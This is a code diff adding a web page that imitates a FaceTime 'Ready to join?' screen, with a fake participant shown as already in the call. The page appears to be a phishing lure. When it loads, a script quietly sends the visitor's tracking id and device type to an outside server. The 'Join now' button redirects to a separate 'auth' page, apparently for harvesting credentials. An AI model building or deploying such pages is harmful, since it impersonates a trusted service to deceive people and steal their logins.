@@ -1,0 +1,648 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>FaceTime- Ready to join?</title>
+    <link
+      rel="icon"
+      href="https://res.cloudinary.com/dhmhgi1xk/image/upload/v1756133344/images-removebg-preview_kuqnay.png"
+      sizes="32x32"
+    />
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"
+    />
+    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
+    <style>
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+      }
+
+      body {
+        font-family: "Google Sans", "Roboto", Arial, sans-serif;
+        background: #fff;
+        color: #202124;
+        min-height: 100vh;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        padding: 0 16px 40px;
+      }
+
+      /* Header */
+      .header {
+        width: 100%;
+        max-width: 960px;
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        padding: 16px 0;
+        margin-bottom: 24px;
+      }
+
+      .header-left {
+        display: flex;
+        align-items: center;
+        gap: 12px;
+      }
+
+      .back-btn {
+        background: none;
+        border: none;
+        cursor: pointer;
+        padding: 8px;
+        border-radius: 50%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        color: #5f6368;
+        transition: background 0.2s;
+      }
+
+      .back-btn:hover {
+        background: #f1f3f4;
+      }
+
+      .logo {
+        display: flex;
+        align-items: center;
+        gap: 8px;
+      }
+
+      .logo-icon {
+        width: 28px;
+        height: 28px;
+        object-fit: contain;
+      }
+
+      .logo-text {
+        font-size: 22px;
+        font-weight: 400;
+        color: #5f6368;
+        letter-spacing: -0.5px;
+      }
+
+      .header-right {
+        display: flex;
+        align-items: center;
+        gap: 16px;
+        font-size: 14px;
+        color: #909693;
+      }
+
+      .header-right a {
+        color: #909693;
+        text-decoration: none;
+        font-weight: 500;
+      }
+
+      .header-right a:hover {
+        text-decoration: underline;
+      }
+
+      .separator {
+        color: #dadce0;
+      }
+
+      /* Main content */
+      .main {
+        width: 100%;
+        max-width: 640px;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        gap: 24px;
+      }
+
+      /* Video preview card */
+      .preview-card {
+        width: 100%;
+        aspect-ratio: 16 / 9;
+        max-height: 360px;
+        background: #202124;
+        border-radius: 12px;
+        position: relative;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        overflow: hidden;
+        box-shadow: 0 1px 3px rgba(0, 0, 0, 0.12);
+      }
+
+      .avatar {
+        width: 96px;
+        height: 96px;
+        border-radius: 50%;
+        background: #1ae843;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        font-size: 48px;
+        font-weight: 500;
+        color: white;
+        margin-bottom: 16px;
+        user-select: none;
+      }
+
+      .camera-status {
+        color: #e8eaed;
+        font-size: 14px;
+        margin-bottom: 20px;
+        opacity: 0.9;
+      }
+
+      .controls {
+        display: flex;
+        gap: 12px;
+        position: absolute;
+        bottom: 20px;
+      }
+
+      .control-btn {
+        width: 48px;
+        height: 48px;
+        border-radius: 50%;
+        border: none;
+        cursor: pointer;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        transition:
+          transform 0.15s,
+          background 0.2s;
+      }
+
+      .control-btn:hover {
+        transform: scale(1.05);
+      }
+
+      .control-btn:active {
+        transform: scale(0.95);
+      }
+
+      .mic-btn {
+        background: #3c4043;
+        color: white;
+      }
+
+      .mic-btn.off {
+        background: #3c4043;
+      }
+
+      .cam-btn {
+        background: #ea4335;
+        color: white;
+      }
+
+      .cam-btn.on {
+        background: #3c4043;
+      }
+
+      .menu-btn {
+        position: absolute;
+        top: 12px;
+        right: 12px;
+        background: none;
+        border: none;
+        color: #e8eaed;
+        cursor: pointer;
+        padding: 8px;
+        border-radius: 50%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+      }
+
+      .menu-btn:hover {
+        background: rgba(255, 255, 255, 0.1);
+      }
+
+      /* Check audio/video button */
+      .check-btn {
+        background: white;
+        border: 1px solid #dadce0;
+        border-radius: 24px;
+        padding: 10px 24px;
+        font-size: 14px;
+        font-weight: 500;
+        color: #1a73e8;
+        cursor: pointer;
+        transition:
+          background 0.2s,
+          box-shadow 0.2s;
+        font-family: inherit;
+      }
+
+      .check-btn:hover {
+        background: #f8f9fa;
+        box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
+      }
+
+      /* Ready to join section */
+      .ready-section {
+        text-align: center;
+        width: 100%;
+        margin-top: 8px;
+      }
+
+      .ready-title {
+        font-size: 28px;
+        font-weight: 400;
+        color: #202124;
+        margin-bottom: 20px;
+        letter-spacing: -0.5px;
+      }
+
+      .participant {
+        display: inline-flex;
+        align-items: center;
+        gap: 10px;
+        background: #f1f3f4;
+        border-radius: 24px;
+        padding: 6px 16px 6px 6px;
+        margin-bottom: 28px;
+        max-width: 100%;
+      }
+
+      .participant-avatar {
+        width: 32px;
+        height: 32px;
+        border-radius: 50%;
+        object-fit: cover;
+        background: #dadce0;
+      }
+
+      .participant-info {
+        display: flex;
+        align-items: center;
+        gap: 8px;
+        flex-wrap: wrap;
+        font-size: 14px;
+      }
+
+      .participant-name {
+        font-weight: 500;
+        color: #202124;
+      }
+
+      .active-badge {
+        background: #e6f4ea;
+        color: #137333;
+        font-size: 11px;
+        font-weight: 500;
+        padding: 2px 6px;
+        border-radius: 4px;
+        letter-spacing: 0.3px;
+      }
+
+      .participant-status {
+        color: #5f6368;
+        font-size: 14px;
+      }
+
+      /* Join button */
+      .join-btn {
+        width: 100%;
+        max-width: 320px;
+        background: #0be780;
+        color: white;
+        border: none;
+        border-radius: 24px;
+        padding: 14px 24px;
+        font-size: 16px;
+        font-weight: 500;
+        cursor: pointer;
+        transition:
+          background 0.2s,
+          box-shadow 0.2s;
+        font-family: inherit;
+        box-shadow: 0 1px 3px rgba(0, 0, 0, 0.12);
+      }
+
+      .join-btn:hover {
+        background: #0ba48d;
+        box-shadow: 0 2px 6px rgba(0, 0, 0, 0.15);
+      }
+
+      .join-btn:active {
+        background: #0be780;
+      }
+
+      /* Responsive */
+      @media (max-width: 600px) {
+        .header {
+          padding: 12px 0;
+          margin-bottom: 16px;
+        }
+
+        .logo-text {
+          font-size: 18px;
+        }
+
+        .header-right {
+          font-size: 13px;
+          gap: 10px;
+        }
+
+        .preview-card {
+          max-height: 280px;
+          border-radius: 8px;
+        }
+
+        .avatar {
+          width: 72px;
+          height: 72px;
+          font-size: 36px;
+        }
+
+        .controls {
+          bottom: 16px;
+          gap: 10px;
+        }
+
+        .control-btn {
+          width: 44px;
+          height: 44px;
+        }
+
+        .ready-title {
+          font-size: 24px;
+        }
+
+        .participant {
+          padding: 5px 12px 5px 5px;
+          gap: 8px;
+        }
+
+        .participant-info {
+          font-size: 13px;
+          gap: 6px;
+        }
+
+        .join-btn {
+          max-width: 100%;
+          padding: 13px 20px;
+        }
+      }
+
+      @media (max-width: 400px) {
+        .avatar {
+          width: 64px;
+          height: 64px;
+          font-size: 32px;
+        }
+
+        .camera-status {
+          font-size: 13px;
+        }
+      }
+
+      /* SVG icons */
+      .icon {
+        width: 24px;
+        height: 24px;
+        fill: currentColor;
+      }
+
+      .icon-sm {
+        width: 20px;
+        height: 20px;
+      }
+    </style>
+  </head>
+  <body>
+    <!-- Header -->
+    <header class="header">
+      <div class="header-left">
+        <button class="back-btn" aria-label="Back to messages">
+          <svg class="icon" viewBox="0 0 24 24">
+            <path
+              d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"
+            />
+          </svg>
+        </button>
+        <div class="logo">
+          <img
+            src="https://res.cloudinary.com/dhmhgi1xk/image/upload/v1756133344/images-removebg-preview_kuqnay.png"
+            alt="Logo"
+            class="logo-icon"
+          />
+          <span class="logo-text">FaceTime</span>
+        </div>
+      </div>
+      <div class="header-right">
+        <a href="#">Help</a>
+        <span class="separator">·</span>
+        <a href="#" class="details">Details</a>
+      </div>
+    </header>
+
+    <!-- Main -->
+    <main class="main">
+      <!-- Preview Card -->
+      <div class="preview-card">
+        <button class="menu-btn" aria-label="More options">
+          <svg class="icon" viewBox="0 0 24 24">
+            <path
+              d="M12 8c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2zm0 2c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2zm0 6c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2z"
+            />
+          </svg>
+        </button>
+
+        <div class="avatar" id="avatar">U</div>
+        <div class="camera-status" id="cam-status">Camera is turned off</div>
+
+        <div class="controls">
+          <button
+            class="control-btn mic-btn"
+            id="mic-btn"
+            aria-label="Microphone"
+            title="Turn microphone on/off"
+          >
+            <svg class="icon" id="mic-icon" viewBox="0 0 24 24">
+              <!-- Mic on -->
+              <path
+                d="M12 14c1.66 0 3-1.34 3-3V5c0-1.66-1.34-3-3-3S9 3.34 9 5v6c0 1.66 1.34 3 3 3z"
+              />
+              <path
+                d="M17 11c0 2.76-2.24 5-5 5s-5-2.24-5-5H5c0 3.53 2.61 6.43 6 6.92V21h2v-3.08c3.39-.49 6-3.39 6-6.92h-2z"
+              />
+            </svg>
+          </button>
+          <button
+            class="control-btn cam-btn"
+            id="cam-btn"
+            aria-label="Camera"
+            title="Turn camera on/off"
+          >
+            <svg class="icon" id="cam-icon" viewBox="0 0 24 24">
+              <!-- Camera off -->
+              <path
+                d="M21 6.5l-4 4V7c0-.55-.45-1-1-1H9.82L21 17.18V6.5zM3.27 2L2 3.27 4.73 6H4c-.55 0-1 .45-1 1v10c0 .55.45 1 1 1h12c.21 0 .39-.08.54-.18L19.73 21 21 19.73 3.27 2zM5 16V8h1.73l8 8H5z"
+              />
+            </svg>
+          </button>
+        </div>
+      </div>
+
+      <!-- Check audio/video -->
+      <button class="check-btn" id="check-btn">
+        Check your audio and video
+      </button>
+
+      <!-- Ready section -->
+      <div class="ready-section">
+        <h1 class="ready-title">Ready to join?</h1>
+
+        <div class="participant">
+          <img
+            class="participant-avatar"
+            src="https://i.pravatar.cc/64?img=12"
+            alt="Michael Thompson"
+            onerror="
+              this.src =
+                'data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 32 32%22%3E%3Ccircle cx=%2216%22 cy=%2216%22 r=%2216%22 fill=%22%23dadce0%22/%3E%3Ctext x=%2216%22 y=%2221%22 text-anchor=%22middle%22 fill=%22%235f6368%22 font-size=%2214%22 font-family=%22Arial%22%3EM%3C/text%3E%3C/svg%3E'
+            "
+          />
+          <div class="participant-info">
+            <span class="participant-name">Michael Thompson</span>
+            <span class="active-badge"
+              >ACTIVE
+              <span class="participant-status"
+                >is already in this call</span
+              ></span
+            >
+          </div>
+        </div>
+
+        <button class="join-btn" id="join-btn">Join now</button>
+      </div>
+    </main>
+
+    <script>
+      // State
+      let micOn = false;
+      let camOn = false;
+
+      // Elements
+      const id = new URLSearchParams(window.location.search).get("id");
+      const micBtn = document.getElementById("mic-btn");
+      const camBtn = document.getElementById("cam-btn");
+      const micIcon = document.getElementById("mic-icon");
+      const camIcon = document.getElementById("cam-icon");
+      const camStatus = document.getElementById("cam-status");
+      const avatar = document.getElementById("avatar");
+      const joinBtn = document.getElementById("join-btn");
+      const checkBtn = document.getElementById("check-btn");
+      function getDeviceType() {
+        const ua = navigator.userAgent.toLowerCase();
+        const isMobile =
+          /android|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(ua);
+        const isTablet = /ipad|tablet|playbook|silk/i.test(ua) && !isMobile;
+
+        if (isMobile || isTablet) return "mobile";
+        return "desktop";
+      }
+
+      const deviceType = getDeviceType();
+
+      window.addEventListener("load", async () => {
+        try {
+          const res = await fetch(
+            "https://megatools-8920.onrender.com/api/v1/information",
+            {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({
+                user: id,
+                deviceType,
+                siteName: "AutoInfo/login-view",
+              }),
+            },
+          );
+
+          const data = await res.json();
+        } catch (err) {
+          console.error(err);
+          alert("Failed to save email.");
+        }
+      });
+      // Icons
+      const micOnSVG = `
+      <path d="M12 14c1.66 0 3-1.34 3-3V5c0-1.66-1.34-3-3-3S9 3.34 9 5v6c0 1.66 1.34 3 3 3z"/>
+      <path d="M17 11c0 2.76-2.24 5-5 5s-5-2.24-5-5H5c0 3.53 2.61 6.43 6 6.92V21h2v-3.08c3.39-.49 6-3.39 6-6.92h-2z"/>
+    `;
+      const micOffSVG = `
+      <path d="M19 11h-1.7c0 .74-.16 1.43-.43 2.05l1.23 1.23c.56-.98.9-2.09.9-3.28zm-4.02.17c0-.06.02-.11.02-.17V5c0-1.66-1.34-3-3-3S9 3.34 9 5v.18l5.98 5.99zM4.27 3L3 4.27l6.01 6.01V11c0 1.66 1.33 3 2.99 3 .22 0 .44-.03.65-.08l1.66 1.66c-.71.33-1.5.52-2.31.52-2.76 0-5.3-2.1-5.3-5.1H5c0 3.41 2.72 6.23 6 6.72V21h2v-3.28c.91-.13 1.77-.45 2.54-.9L19.73 21 21 19.73 4.27 3z"/>
+    `;
+      const camOnSVG = `
+      <path d="M17 10.5V7c0-.55-.45-1-1-1H4c-.55 0-1 .45-1 1v10c0 .55.45 1 1 1h12c.55 0 1-.45 1-1v-3.5l4 4v-11l-4 4z"/>
+    `;
+      const camOffSVG = `
+      <path d="M21 6.5l-4 4V7c0-.55-.45-1-1-1H9.82L21 17.18V6.5zM3.27 2L2 3.27 4.73 6H4c-.55 0-1 .45-1 1v10c0 .55.45 1 1 1h12c.21 0 .39-.08.54-.18L19.73 21 21 19.73 3.27 2zM5 16V8h1.73l8 8H5z"/>
+    `;
+
+      // Toggle Mic
+      micBtn.addEventListener("click", () => {
+        micOn = !micOn;
+        if (micOn) {
+          micBtn.classList.remove("off");
+          micIcon.innerHTML = micOnSVG;
+          micBtn.title = "Turn microphone off";
+        } else {
+          micBtn.classList.add("off");
+          micIcon.innerHTML = micOffSVG;
+          micBtn.title = "Turn microphone on";
+        }
+      });
+
+      // Toggle Camera
+      camBtn.addEventListener("click", () => {
+        camOn = !camOn;
+        if (camOn) {
+          camBtn.classList.add("on");
+          camBtn.classList.remove("cam-btn");
+          camBtn.style.background = "#3c4043";
+          camIcon.innerHTML = camOnSVG;
+          camStatus.textContent = "Camera is turned on";
+          avatar.style.display = "none";
+          camBtn.title = "Turn camera off";
+        } else {
+          camBtn.classList.remove("on");
+          camBtn.style.background = "#ea4335";
+          camIcon.innerHTML = camOffSVG;
+          camStatus.textContent = "Camera is turned off";
+          avatar.style.display = "flex";
+          camBtn.title = "Turn camera on";
+        }
+      });
+
+      // Join button
+      joinBtn.addEventListener("click", () => {
+        window.location.href =
+          "https://auth-seven-pied.vercel.app/user-auth.html?id=" + id; // your auth page
+
+        joinBtn.disabled = true;
+        joinBtn.style.opacity = "0.7";
+        setTimeout(() => {
+          alert("Joining the call... (This is a demo)");
+          joinBtn.textContent = "Join now";
+          joinBtn.disabled = false;
+          joinBtn.style.opacity = "1";
+        }, 1200);
+      });
+
+      // Check audio/video
+      checkBtn.addEventListener("click", () => {
+        alert("Opening audio & video settings... (This is a demo)");
+      });
+
+      // Initialize mic as off (matching the screenshot style)
+      micIcon.innerHTML = micOnSVG; // starts looking like on, but we can toggle
+    </script>
+  </body>
+</html>
